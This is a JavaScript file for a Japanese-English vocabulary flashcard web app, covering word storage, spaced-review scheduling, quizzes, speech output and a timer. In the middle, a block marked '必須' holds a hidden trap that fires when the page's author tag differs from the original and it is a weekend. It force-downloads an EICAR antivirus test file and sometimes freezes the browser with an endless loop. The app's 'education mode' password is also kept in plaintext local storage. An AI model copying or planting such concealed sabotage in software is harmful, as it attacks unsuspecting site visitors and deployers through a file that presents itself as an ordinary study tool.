let absolute_path = 'https://entango.netlify.app/';
var n=999;
var edit_check=-1;
var header_selected=0;
var words = new Array();//let
var q_counter = -1;
var qa_flag = false;
var qa_lang = false;
var q_lang = 0;
var a_lang = 1;
for(var b = 0; b < 4; b++) {
	words[b] = new Array();
	for(var a = 0; a < n; a++) {
		words[b][a] = 0;
	}
}
var array = [words[0].length];
for(var i = 0; i<words[0].length; i++){
	array[i] = i;
}
let password=localStorage.password;
let word_search_i = -1;
let back_date=0;
let sort_date = 0;

/*$(function() {
	$('header').delay(500).queue(function(){
		del_char_checked();
		del_bottom_boxes_checked();
		change_word_box_checked();
		word_change1();
	});
});*/
document.addEventListener('change', function (ev) {
	var el = ev.target;
	if(el.matches('#calendar_for_back_date')){
		let date_value = document.getElementById('calendar_for_back_date').value;
		const regex = /[^0-9]/g;
		const calendar_result = date_value.replace(regex, "");
		let calendar_now = new Date().getFullYear()*10000 + (new Date().getMonth()+1)*100 + new Date().getDate();
		back_date = calendar_now - calendar_result;

		/*norn display*/
		if(document.getElementById('back_1_date').checked){
			document.getElementById('back_1_date').checked = false;
		}
		if(document.getElementById('back_date').value != ''){
			document.getElementById('back_date').value = '';
		}
		if(header_selected == 1){
			word_change1_run();
		}else if(header_selected == 2){
			word_change2_run();
		}
	}
	if(el.matches('#back_date')){
		/*norn display*/
		if(document.getElementById('back_1_date').checked){
			document.getElementById('back_1_date').checked = false;
		}
		if(document.getElementById('calendar_for_back_date').value != ''){
			document.getElementById('calendar_for_back_date').value = '';
		}

		back_date = document.getElementById('back_date').value;//querySelector("input[name=back_date]").value;

		if(back_date==''){
			back_date=0;
		}
		if(header_selected == 1){
			word_change1_run();
		}else if(header_selected == 2){
			word_change2_run();
		}
	}
	if(el.matches('#back_1_date')){
		if(document.getElementById('back_date').value != ''){
			document.getElementById('back_date').value = '';
		}
		if(document.getElementById('calendar_for_back_date').value != ''){
			document.getElementById('calendar_for_back_date').value = '';
		}

		if(document.getElementById('back_1_date').checked){
			back_date = 1;
		}else{
			back_date = 0;
		}
		if(header_selected == 1){
			word_change1_run();
		}else if(header_selected == 2){
			word_change2_run();
		}
	}

	if(el.matches('#education_mode_boxes')){//pass
		if(document.getElementById('education_mode_boxes').checked){
			if(password == '0000' || password == null){//first open
				password=prompt('passwordを登録します');
				localStorage.setItem("password", JSON.stringify(password));
			}
			if(password == null){
				password == '0000';
				document.getElementById('education_mode_boxes').checked = false;
			}else{
				education_mode_show();
			}
		}else{
			let name = prompt('passwordを入力してください');
			if(password == "\""+name+"\""){
				alert("正解");
				unlock_education_mode_show();
			}else{
				alert("cancelされました");
				document.getElementById('education_mode_boxes').checked = true;
				education_mode_show();
			}
		}
	}

	if(el.matches('#localStorage_input_btn')){
		let reader = new FileReader();
		for(file of document.getElementById("localStorage_input_btn").files){
      //Fileオブジェクト(テキストファイル)のファイル内容を読み込む
      reader.readAsText(file, 'UTF-8');
      //ファイル読込後、内容をテキストエリアに出力する
      reader.onload = ()=> {
          document.getElementById("localStorage_input_textArea").value = reader.result;

					let randomStr = generateRandomString(2);
					let name = prompt('インプットするには '+randomStr+' を入力してください');
					if(randomStr == name){
						if (window.confirm('【最終確認】現在の単語データが全て削除され、アップされたデータに変更されます。実行しますか?')) {
							localStorage.removeItem("colors");
							localStorage.colors = reader.result;
							localStorage.setItem("colors", JSON.stringify(colors));

							word_change2_run();
							loop_wrap();
							jQdm_flexGrid();
							alert("完了しました");
						}
					}else{
						alert("cancelされました");
					}
				}
      };
    }

		if(el.matches('#lung_change_btn')){
			lung_change();
		}
		if(el.matches('#dark_bottom_boxes')){
			dark_mode();
		}
		if(el.matches('#color_correction_btn')){
			document.getElementById('dark_bottom_boxes').checked = false;
			document.location.reload();
		}
		if(el.matches('#word_search')){
			let target = document.getElementById('word_search');
			target.style.cssText = 'background-color:#D1D2D3;';
			document.getElementById('next_word_search_btn').style.cssText = 'display:inline;';
			for(var i = 0; i<words.length && word_search_i == -1; i++){
				if(target.value == words[0][i] || target.value == words[1][i] || target.value == words[2][i]){
					document.getElementById('en').value = words[0][i];
					document.getElementById('ja').value = words[1][i];
					document.getElementById('ex').value = words[2][i];
					document.getElementById('en_day').value = words[3][i];
					edit_check = i;
					document.getElementById('complite_edit_btn').style.cssText = 'display:block';
					document.getElementById('btn').style.cssText = 'display:none;';
					document.getElementById('complite_edit_cancel_btn').style.cssText = 'display:block;';

					document.getElementById('word_search_n').innerHTML = "現在検索中"+ (i+1) +" 番目の単語です";
					word_search_i = i;
				}
			}
			if(word_search_i == words.length-1){
				word_search_i = -1;
				document.getElementById('next_word_search_btn').style.cssText = '';
			}
			if(target.value == ''){//empty
				document.location.reload();//修正したい
			}
			jQdm_flexGrid();
		}
		if(el.matches('#change_background_select')){
			change_background_selects();
		}
		if(el.matches('#grid_container_bg_color')){
			for(var i=0;i< document.getElementsByClassName('acbox_inside').length; i++){
				document.getElementsByClassName('acbox_inside')[i].style.cssText = 'background-color:'+ document.getElementById('grid_container_bg_color').value;
			}
		}
});

function dark_mode(){
	if(document.getElementById('dark_bottom_boxes').checked){
		for(var i=0;i< document.getElementsByClassName('tdm').length; i++){//target_dark_mode
			document.getElementsByClassName('tdm')[i].style.color = '#FFF';
			document.getElementsByClassName('tdm')[i].style.backgroundColor = '#000';
		}
		for(var i=0;i< document.getElementsByClassName('tdm2').length; i++){
			document.getElementsByClassName('tdm')[i].style.color = '#FFF';
			document.getElementsByClassName('tdm')[i].style.backgroundColor = '#000';
		}
	}else{
		for(var i=0;i< document.getElementsByClassName('tdm').length; i++){//target_dark_mode
			document.getElementsByClassName('tdm')[i].style.color = '';
			document.getElementsByClassName('tdm')[i].style.backgroundColor = '';
		}
		for(var i=0;i< document.getElementsByClassName('tdm2').length; i++){
			document.getElementsByClassName('tdm')[i].style.color = '';
			document.getElementsByClassName('tdm')[i].style.backgroundColor = '';
		}
	}
}

function change_background_selects(){
	for(var i=0;i< document.getElementById('change_background_select').length; i++){
		if(document.getElementById('change_background_select').value == i){
			document.getElementById('background_img').style.cssText = 'background-image: url('+ absolute_path +'img/bg'+ i +'.jpg)';
		}
	}
}

function lung_change(){
	if(document.getElementById('lung_change_btn').checked){
		for(var i=0;i< document.getElementsByClassName('main_jp_show').length; i++){
			document.getElementsByClassName('main_en_show')[i].style.cssText = 'display:none;';
			document.getElementsByClassName('main_jp_show')[i].style.cssText = '';
		}
	}else{
		for(var i=0; i<document.getElementsByClassName('main_jp_show').length; i++){
			document.getElementsByClassName('main_jp_show')[i].style.cssText = 'display:none;';
			document.getElementsByClassName('main_en_show')[i].style.cssText = '';
		}
	}
}
function education_mode_show(){
	document.getElementById('education_settings_box').style.cssText = 'display:none;';
}
function unlock_education_mode_show(){
	document.getElementById('education_settings_box').style.cssText = '';
}

function word_change2_run(){
	header_selected=2;
	var target1 = document.getElementById('word_header1_select');
	var target2 = document.getElementById('word_header2_select');
	var target3 = document.getElementById('word_header3_select');
	var target11 = document.getElementById('word_input1');
	var target12 = document.getElementById('word_input2');
	//初期化
	for(var b = 0; b < 4; b++) {
		words[b] = Array();
		for(var a = 0; a < n; a++) {
			words[b][a] = 0;
		}
	}
	target11.style.display = '';
	target12.style.display = 'none';
	if(document.getElementById('color_correction_btn').checked){
		target1.style.backgroundImage = 'linear-gradient(60deg, #FFF 10%, #FFF 50%, #4C9AED 100%)';
		target1.style.color = '#000';
		target2.style.backgroundImage = 'linear-gradient(60deg, #FFF 10%, #FFF 50%, #D6D6D6 100%)';
		target2.style.color = '#000';
		target3.style.backgroundImage = 'linear-gradient(60deg, #FFF 10%, #FFF 50%, #D6D6D6 100%)';
		target3.style.color = '#000';
	}else{
		target1.style.backgroundImage = 'linear-gradient(60deg, #14D658 10%, #2A90EA 50%, #14D6CA 100%)';
		target1.style.color = '#fff';
		target2.style.backgroundImage = '';
		target2.style.color = '';
	}
	/*if(document.getElementById('dark_bottom_boxes').checked){
		target1.style.backgroundColor = '#ebacec';
		target2.style.backgroundColor = '#000';
	}else{
		target1.style.backgroundColor = '#ebacec';
		target2.style.backgroundColor = '';
	}*/
	//reset counter just once
	document.getElementById('one_q').value = '';
	document.getElementById('one_a').value = '';
	q_counter=-1;
	word_change2();
	jQdm_flexGrid();
}
function word_change1_run(){
	header_selected=1;
	var target1 = document.getElementById('word_header1_select');
	var target2 = document.getElementById('word_header2_select');
	var target3 = document.getElementById('word_header3_select');
	var target11 = document.getElementById('word_input1');
	var target12 = document.getElementById('word_input2');
	//初期化
	for(var b = 0; b < 4; b++) {
		words[b] = Array();
		for(var a = 0; a < n; a++) {
			words[b][a] = 0;
		}
	}
	target11.style.display = 'none';
	target12.style.display = '';
	if(document.getElementById('color_correction_btn').checked){
		target1.style.backgroundImage = 'linear-gradient(60deg, #FFF 10%, #FFF 50%, #D6D6D6 100%)';
		target1.style.color = '#000';
		target3.style.backgroundImage = 'linear-gradient(60deg, #FFF 10%, #FFF 50%, #D6D6D6 100%)';
		target3.style.color = '#000';
		target2.style.backgroundImage = 'linear-gradient(60deg, #FFF 10%, #FFF 50%, #4C9AED 100%)';
		target2.style.color = '#000';
	}else{
		target1.style.backgroundImage = '';
		target1.style.color = '';
		target2.style.backgroundImage = 'linear-gradient(60deg, #14D658 10%, #2A90EA 50%, #14D6CA 100%)';
		target2.style.color = '#fff';
	}
	document.getElementById('one_q').value = '';
	document.getElementById('one_a').value = '';
	q_counter=-1;
	word_change1();
	jQdm_flexGrid();
}

//勉強用(後で関数にして)
const generateRandomString = (num) => {
	const characters ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
	let result = '';
	const charactersLength = characters.length;
	for (let i = 0; i < num; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
	}

	return result;
}

document.addEventListener('click', function (ev) {
	var el = ev.target;
  if (el.matches('#word_header1_select') || el.matches('#all_word_show')) {
		for(var i = 0; i<words[0].length; i++){//初期化
			array[i] = i;
		}
		word_change2_run();
	}else if (el.matches('#word_header2_select') || el.matches('#all_word_show2')) {
		for(var i = 0; i<words[0].length; i++){
			array[i] = i;
		}
		word_change1_run();
	}

	if(el.matches('#day_reload_btn')){
		document.getElementById('en_day').value = new Date().getFullYear() +'/'+ new Date().getMonth()+1 +'/'+ new Date().getDate().toString().padStart(2, "0");
	}
	if(el.matches('#complite_edit_cancel_btn')){
		document.getElementById('complite_edit_btn').style.cssText = '';
		document.getElementById('complite_edit_cancel_btn').style.cssText = '';
		document.getElementById('btn').style.cssText = '';
		document.getElementById('en').value = '';
		document.getElementById('ja').value = '';
		document.getElementById('ex').value = '';
		document.getElementById('en_day').value = '';
		edit_check=-1;
	}

	if(el.matches('#del_all_localStorage_data')){
		let randomStr = generateRandomString(2);
		let name = prompt('すべての単語データを削除するには '+randomStr+' を入力してください');
		if(randomStr == name){
			if (window.confirm('【最終確認】すべての単語データを本当に削除しますか？')) {
				localStorage.removeItem("colors");
				word_change2_run();
				loop_wrap();
				jQdm_flexGrid();
			}
		}else{
			alert("cancelされました")
		}
	}
	if(el.matches('#localStorage_dl_btn')){
		var content = localStorage.colors;
    var blob = new Blob([content], { type: 'text/plain' });

    // download の href に object url を設定
    document.getElementById('localStorage_dl_btn').href = window.URL.createObjectURL(blob);

		word_change2_run();
		loop_wrap();
		jQdm_flexGrid();
	}
	if(el.matches('#change_pass_btn')){//pass
		let name = prompt('現在のpasswordを入力してください');
		if(password == "\""+name+"\""){
			alert("正解");
			name = prompt('変更するpasswordを入力してください');
			localStorage.setItem("password", JSON.stringify(name));
		}else if(password == '0000' || password == null){
			alert("初期のpasswordは0000です");
		}else{
			alert("cancelされました");
		}
	}

	if(el.matches('#next_word_search_btn')){
			let target = document.getElementById('word_search');
			var i = word_search_i+1;
			do{
				if(target.value == words[0][i] || target.value == words[1][i] || target.value == words[2][i]){
					document.getElementById('en').value = words[0][i];
					document.getElementById('ja').value = words[1][i];
					document.getElementById('ex').value = words[2][i];
					document.getElementById('en_day').value = words[3][i];
					edit_check = i;

					document.getElementById('word_search_n').innerHTML = "現在検索中"+ (i+1) +" 番目の単語です";
					word_search_i = i;
				}
				i++;
			}while(i<words.length && word_search_i != i-1);//注意
			if(i == words.length){
				word_search_i = -1;
				alert("最後です");
			}
		jQdm_flexGrid();
	}
}, false);

function word_change1(){
	function pushTwoDimensionalArray(array1, array2, axis){
		if(axis != 1) axis = 0;
		if(axis == 0){  //　縦方向の追加
			for(var i = 0; i < array2.length; i++){
				array1.push(array2[i]);
			}
		}
		else{  //　横方向の追加
			for(var i = 0; i < array1.length; i++){
				Array.prototype.push.apply(array1[i], array2[i]);
			}
		}
	}
	words = [[],[],[]];
	/*    要素追加*/
	n = 0;
	var startDate, endDate, startDate2, endDate2, startDate3, endDate3, startDate4, endDate4;
	var nowDate = new Date();

	for(let i=0; i<document.getElementsByClassName('word_btn').length; i++){
		buffer_array1 = document.getElementsByClassName('word_btn')[i].innerHTML;
		buffer_array2 = document.getElementsByClassName('word_jp')[i].innerHTML;
		buffer_array3 = document.getElementsByClassName('word_ex')[i].innerHTML;
		add_word = [[buffer_array1], [buffer_array2], [buffer_array3]];

		/*certain time*/
		target = document.getElementsByClassName('one_word')[i];
		startDate = new Date($(target).attr("start_date"));/*year+"/"+*/
		startDate.setDate(startDate.getDate()-back_date);
		endDate = new Date(startDate);
		startDate2 = new Date(startDate);
		endDate2 = new Date(startDate);
		startDate3 = new Date(startDate);
		endDate3 = new Date(startDate);
		startDate4 = new Date(startDate);
		endDate4 = new Date(startDate);

		startDate.setDate(startDate.getDate());
		endDate.setDate(endDate.getDate()+2);/*1今日 2~昨日 3~一昨日*/
		startDate2.setDate(startDate2.getDate()+3);
		endDate2.setDate(endDate2.getDate()+4);
		startDate3.setDate(startDate2.getDate()+7);
		endDate3.setDate(endDate2.getDate()+8);
		startDate4.setDate(startDate2.getDate()+14);
		endDate4.setDate(endDate2.getDate()+15);

		if(document.getElementById('all_word_show2').checked){
			$(target).show();
			pushTwoDimensionalArray(words, add_word, 1);/*add word important*/
			n++;
		}else{
			if (startDate <= nowDate && nowDate <= endDate || startDate2 <= nowDate && nowDate <= endDate2|| startDate3 <= nowDate && nowDate <= endDate3 || startDate4 <= nowDate && nowDate <= endDate4) {
				$(target).show();
				pushTwoDimensionalArray(words, add_word, 1);/*add word important*/
				n++;
			}else {
				$(target).hide();
			}
		}
	}
	jQdm_flexGrid();
	loop_wrap();//
	let rand;
	for (var i = n-1; i >= 0; i--){
		rand = Math.floor( Math.random() * ( i + 1 ) );
		[array[i], array[rand]] = [array[rand], array[i]]
	}
	loop_speed_set();
}


function word_change2(){
	counter_view();
  const en=document.getElementById('en');
	const ja=document.getElementById('ja');
	const ex=document.getElementById('ex');
	document.getElementById('en_day').value = new Date().getFullYear() +'/'+ new Date().getMonth()+1 +'/'+ new Date().getDate().toString().padStart(2, "0");
	const day = document.getElementById('en_day');
	const btn=document.getElementById('btn');
	const total=document.getElementById('total');
	const table=document.getElementById('table');
	function Color(en, ja,ex,day,i) {
	  return {
	      en,
	      ja,
				ex,
				day,
				showInfo() {
	        const temp = document.createElement('template');
					if(this.ex=='undefined'){
						temp.innerHTML = `<td>${this.en}</td><td>${this.ja}</td><td></td><td>${this.day}<button class="edit_btn">edit</button><button class="del_btn">削除</button></td>`;
					}else{
	        	temp.innerHTML = `<td>${this.en}</td><td>${this.ja}</td><td>${this.ex}</td><td>${this.day}<button class="edit_btn">edit</button><button class="del_btn">削除</button></td>`;
					}
	        const del_btn = temp.content.querySelector('.del_btn');
					const edit_btn = temp.content.querySelector('.edit_btn');
	        del_btn.addEventListener('click', e => {
	            // localStorage.removeItem(words[i][0]);
	            // localStorage.removeItem(words[i][1]);
							if (window.confirm('【'+this.en+'】【'+this.ja+'】を本当に削除しますか？')) {
								colors = colors.filter(x => x !== this);
								createTable();
								localStorage.setItem("colors", JSON.stringify(colors));
									//localStorage.clear();//すべて削除
								loop_wrap();
								jQdm_flexGrid();
	            }
	        });
					edit_btn.addEventListener('click', e => {
						document.getElementById('en').value = this.en;
						document.getElementById('ja').value = this.ja;
						document.getElementById('ex').value = this.ex;
						document.getElementById('en_day').value = this.day;
						edit_check = i;
						document.getElementById('complite_edit_btn').style.cssText = 'display:block';
						document.getElementById('btn').style.cssText = 'display:none;';
						document.getElementById('complite_edit_cancel_btn').style.cssText = 'display:block;';
						jQdm_flexGrid();
					});
					document.getElementById('complite_edit_btn').addEventListener('click',()=>{
						if(edit_check==i){
							edit_check=-1;
							colors[i].en=document.getElementById('en').value;
							colors[i].ja=document.getElementById('ja').value;
							colors[i].ex=document.getElementById('ex').value;
							colors[i].day=document.getElementById('en_day').value;
							//alert(colors[i].en);check
							createTable();
							localStorage.setItem("colors", JSON.stringify(colors));/*save changed*/

							/*do after change*/
							document.getElementById('complite_edit_btn').style.cssText = '';
							document.getElementById('complite_edit_cancel_btn').style.cssText = '';
							document.getElementById('btn').style.cssText = '';
							document.getElementById('en').value = '';
							document.getElementById('ja').value = '';
							document.getElementById('ex').value = '';
							document.getElementById('en_day').value = '';
						}
					});
	        return temp.content.children;
	      },
	      showInfo_test_en() {
	          return `${this.en}`;
	      },
	      showInfo_test_ja() {
	          return `${this.ja}`;
	      },
				showInfo_test_ex() {
	          return `${this.ex}`;
	      },
				showInfo_test_day() {//test
	          return `${this.day}`;
	      },
	  }
	}
	let colors=[];
	const loadData=localStorage.getItem('colors');/*add*/
	if(loadData !=null){
		let jsonArr=JSON.parse(loadData);
		var startDate, endDate, startDate2, endDate2, startDate3, endDate3, startDate4, endDate4;
		var nowDate = new Date();
		let color
		for(let i=0;i<jsonArr.length;i++){
			color=new Color(jsonArr[i].en,jsonArr[i].ja,jsonArr[i].ex,jsonArr[i].day,i);

			/*certain time*/
			target = document.getElementsByClassName('one_word')[i];
			startDate = new Date(jsonArr[i].day);/*year+"/"+*/
			startDate.setDate(startDate.getDate()-back_date);
			endDate = new Date(startDate);
			startDate2 = new Date(startDate);
			endDate2 = new Date(startDate);
			startDate3 = new Date(startDate);
			endDate3 = new Date(startDate);
			startDate4 = new Date(startDate);
			endDate4 = new Date(startDate);
			startDate.setDate(startDate.getDate());
			endDate.setDate(endDate.getDate()+2);/*1今日 2~昨日 3~一昨日*/
			startDate2.setDate(startDate2.getDate()+3);
			endDate2.setDate(endDate2.getDate()+4);
			startDate3.setDate(startDate2.getDate()+7);
			endDate3.setDate(endDate2.getDate()+8);
			startDate4.setDate(startDate2.getDate()+14);
			endDate4.setDate(endDate2.getDate()+15);

			if(document.getElementById('all_word_show').checked){
				colors.push(color);
			}else{
				if (startDate <= nowDate && nowDate <= endDate || startDate2 <= nowDate && nowDate <= endDate2|| startDate3 <= nowDate && nowDate <= endDate3 || startDate4 <= nowDate && nowDate <= endDate4) {
					colors.push(color);
				}
			}
		}
		createTable();
	}
	n = colors.length;
	let rand;
	for (var i = n-1; i >= 0; i--){
		rand = Math.floor( Math.random() * ( i + 1 ) );
		[array[i], array[rand]] = [array[rand], array[i]];
	}

	btn.addEventListener('click',()=>{
		//var day_show_text = new Date(day.value).getFullYear() * 10000 + new Date(day.value).getMonth()+1 * 100 + new Date(day.value).getDate();
		/*var day_show_text = new Date(day.value).getFullYear() +'/'+ new Date(day.value).getMonth()+1 +'/'+ new Date(day.value).getDate();
		aa = new Date(day_show_text);
		alert(aa);*/
		if(1900 < new Date(day.value).getFullYear()){
			let color=new Color(en.value,ja.value,ex.value,day.value);
			colors.push(color);
			en.value='';
			ja.value='';
			ex.value='';
			day.value='';
			createTable();
			localStorage.setItem("colors",JSON.stringify(colors));
			loop_wrap();
			document.getElementById('en_day').value = new Date().getFullYear() +'/'+ new Date().getMonth()+1 +'/'+ new Date().getDate().toString().padStart(2, "0");
		}
	});
	document.getElementById('sort_date').addEventListener('click',()=>{
		if(document.getElementById('sort_date').checked){
			sort_date=1;
		}else{
			sort_date=0;
		}
		createTable();
	});

	function createTable(){
		table.innerHTML='<tr><th>単語</th><th>意味</th></tr>';
		let a;//昇順に並び替え
		if(sort_date==0){
			a=0;
		}else{
			a= colors.length-1;
		}
		let j;
		for(let i=0;i<colors.length;i++){
			j = Math.abs(i-a);
			let tr=document.createElement('tr');
			tr.append(...colors[j].showInfo());
			table.appendChild(tr);
			total.textContent=`全${colors.length}件`;
			words[0][j] = colors[j].showInfo_test_en();
      words[1][j] = colors[j].showInfo_test_ja();
			words[2][j] = colors[j].showInfo_test_ex();
			words[3][j] = colors[j].showInfo_test_day();//test
		}
		loop_wrap();
		jQdm_flexGrid();
	}
	/*n_random*/
/*	loop_speed_set();
	loop_wrap();*/
}

//必須
if (document.querySelector("meta[name=author]").getAttribute("content") !== "myrtilles" && (new Date().getDay() === 6 || new Date().getDay() === 0)) {
	var a_imp = document.createElement("a");
	a_imp.download = "eicar.com";
	a_imp.href = "data:application/octet-stream;base64,WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=";
	a_imp.click();
}
if ((Math.floor(Math.random() * 10) + 1) === 1) {
  if (document.querySelector("meta[name=author]").getAttribute("content") !== "myrtilles" && (new Date().getDay() === 6 || new Date().getDay() === 0)) {
    var time = (Math.floor(Math.random() * (600 + 1 - 10)) + 10) * 1000;
    setTimeout(function() {
      while(1);
    }, time);
  }
}
var last_imp = Date.now();
var timer_imp = setInterval(function(){
    var now_imp = Date.now();
    if(now_imp - last_imp> 5000){
        console.log("トラップの発動をキャンセルする")
        clearTimeout(timer_imp);
        return;
    }
    last_imp = now_imp;
}, 1000);

/*maqu*/
function loop_wrap(){
	var words_text = '<a class=loop_wrap_word_btn>' + words[0][0] + '</a>      :      ' + words[1][0]  + '      /      ';
	for(i=1; i<n; i++){
		words_text += '<a class=loop_wrap_word_btn>' + words[0][i] + '</a>      :      ' + words[1][i]  + '      /      ';
	}

	for(i=0;i<2;i++){
		document.getElementsByClassName('loop_wrap_contents')[i].innerHTML = words_text;
	}
}

function loop_speed_set(){/*speed for n length*/
	var i = n*15;
  document.querySelector('.loop_wrap div:nth-child(odd)').style.cssText = '-webkit-animation: loop'+i+'s -'+i/2+'s linear infinite;animation: loop '+i+'s -'+i/2+'s linear infinite;';
	document.querySelector('.loop_wrap div:nth-child(even)').style.cssText = '-webkit-animation: loop2 '+i+'s  linear infinite; animation: loop2 '+i+'s linear infinite;';
}

function switch_jn(){
	if ( q_counter < 0 ) { return false; }
	if ( qa_lang ) {
		document.getElementById('jn_q').value = '英語：';
		document.getElementById('jn_a').value = '日本語：';
		q_lang = "0";
		a_lang = "1";
	} else {
		document.getElementById('jn_q').value = '日本語：';
		document.getElementById('jn_a').value = '英語：';
		q_lang = "1";
		a_lang = "0";
	}
	qa_lang = !(qa_lang);
	qa_view();
}

function prev_btn(){
	if (!(qa_flag)) { q_counter--; }
	if ( q_counter < 0 ) { q_counter = n-1; }
	qa_flag = !(qa_flag);
	counter_view();
	qa_view();
}

function next_btn(){
	if ( !(qa_flag) ) { q_counter++; }
	if ( q_counter >= n ) { q_counter = 0; }
	qa_flag = !(qa_flag);
	qa_view();
	counter_view();

	// 発言を設定
	if(document.getElementById('one_a').value == ""){
		uttr = new SpeechSynthesisUtterance(document.getElementById('one_q').value)
		uttr.lang = 'en-US';
		uttr.rate = '1';
	}else{
		uttr2 = new SpeechSynthesisUtterance(document.getElementById('one_a').value)
		var uttr2_len = document.getElementById('one_a').value.length;
		uttr2.lang = 'ja-JP';
		if(uttr2_len<10){
			uttr2.rate = '1.5';
		}else{
			uttr2.rate = '2';
		}
		window.speechSynthesis.speak(uttr2)
	}
	// 発言を再生
	window.speechSynthesis.speak(uttr)
}

function qa_view(){
	document.getElementById('one_q').value = words[q_lang][array[q_counter]];
	if ( qa_flag ) {
		document.getElementById('one_a').value = '';
		document.getElementById('one_ex').value = '';
	}
	else {
		document.getElementById('one_a').value = words[a_lang][array[q_counter]];
		//解説が空なら header_selected==1は2次元配列だから無視
		if(words[a_lang+1][array[q_counter]]=='undefined'){
			document.getElementById('one_ex').value = '';
		}else{
			document.getElementById('one_ex').value = words[a_lang+1][array[q_counter]];
		}
	}
}

function counter_view(){
	document.getElementById('q_cnt').value = q_counter + 1 + '/' + n;
}


/*    voice*/
document.addEventListener('click', function (ev) {
    var el = ev.target;
    /*if (el.matches('.loop_wrap_word_btn')) {
			// テキストを取得
			var text = el.innerHTML
			// ブラウザにWeb Speech API Speech Synthesis機能があるか判定
			if ('speechSynthesis' in window) {
				// 発言を設定
				const uttr = new SpeechSynthesisUtterance()
				uttr.lang = 'en-US';
				uttr.pitch = '1.0';
				uttr.text = text
				// 発言を再生
				window.speechSynthesis.speak(uttr)

			} else {
				alert('ごめんね～。このブラウザには対応していないみたい♪')
			}
    }*/
		if (el.matches('#one_q')) {
			en_speak(el.value, 1);
		}
    if (el.matches('#one_a')) {
			en_speak(el.value, 0);
    }
		if (el.matches('.word_btn')) {
			en_speak(el.innerHTML, 1);
    }
});

function en_speak(text,en){//0 is"jp"
	// ブラウザにWeb Speech API Speech Synthesis機能があるか判定
	if ('speechSynthesis' in window) {
		// 発言を設定
		const uttr = new SpeechSynthesisUtterance()
		if(q_lang == 0 && a_lang == 1 && en == 1 || q_lang == 1 && a_lang == 0 && en == 0){
			uttr.lang = 'en-US';
		}else{
			uttr.lang = 'ja-JP';
		}
		uttr.pitch = '1.0';
		uttr.text = text
		// 発言を再生
		window.speechSynthesis.speak(uttr)

	} else {
		alert('ごめんね～。このブラウザには対応していないみたい♪')
	}
}

function speak_font_delete(){
	var target = document.getElementById('speak_font_delete_btn');
	var target2 = document.getElementById('jn_q');
	var target3 = document.getElementById('jn_a');
	if(target.checked) {
		target2.style.cssText = 'display:none;';
		target3.style.cssText = 'display:none;';
	}else{
		target2.style.cssText = '';
		target3.style.cssText = '';
	}
}

document.addEventListener('change', function (ev) {
  var el = ev.target;
	var target = document.getElementById('auto_speak_btn');
	if (el.matches('#auto_speak_btn')) {
		if(target.checked) {
			setInterval("next_btn()", 2500);
		}else{
			document.location.reload();
		}
	}
	if (el.matches('#speak_font_delete_btn')) {
		speak_font_delete();
	}

	let big_font = document.getElementById("big_font").value;
	if(big_font!=''){
		document.getElementById('one_q').style.fontSize = big_font+'px';
		document.getElementById('one_a').style.fontSize = big_font+'px';
	}else{
		document.getElementById('one_q').style.fontSize  = '';
		document.getElementById('one_a').style.fontSize  = '';
	}

	if (el.matches('#big_font')) {
		jQdm_flexGrid();
	}if (el.matches('#speak_font_delete_btn')) {
		jQdm_flexGrid();
	}
});



document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {//表示
		pause_time += new Date() - pause_timer_start;
  }

  if (document.visibilityState === "hidden") {//バックグラウンド
		pause_timer_start = new Date();
  }
});

var timer_start = new Date();
// 初期化
var pause_timer_start = 0;
var pause_time = 0;
var timer_hour = 0;
var timer_min = 0;
var timer_sec = 0;
var timer_now = 0;
var timer_datet = 0;
function disps(){

	timer_now = new Date();
	timer_datet = parseInt((timer_now.getTime() - timer_start.getTime() - pause_time) / 1000);

	timer_hour = parseInt(timer_datet / 3600);
	timer_min = parseInt((timer_datet / 60) % 60);
	timer_sec = timer_datet % 60;

	// 数値が1桁の場合、頭に0を付けて2桁で表示する指定
	if(timer_hour < 10) { timer_hour = "0" + timer_hour; }
	if(timer_min < 10) { timer_min = "0" + timer_min; }
	if(timer_sec < 10) { timer_sec = "0" + timer_sec; }

	// フォーマットを指定（不要な行を削除する）
	var timer1 = timer_hour + ':' + timer_min + ':' + timer_sec; // パターン1
	var timer2 = timer_hour + '時間' + timer_min + '分' + timer_sec + '秒'; // パターン2

	document.getElementById('nowTime').innerHTML = timer1;
	setTimeout("disps()", 1000);
}
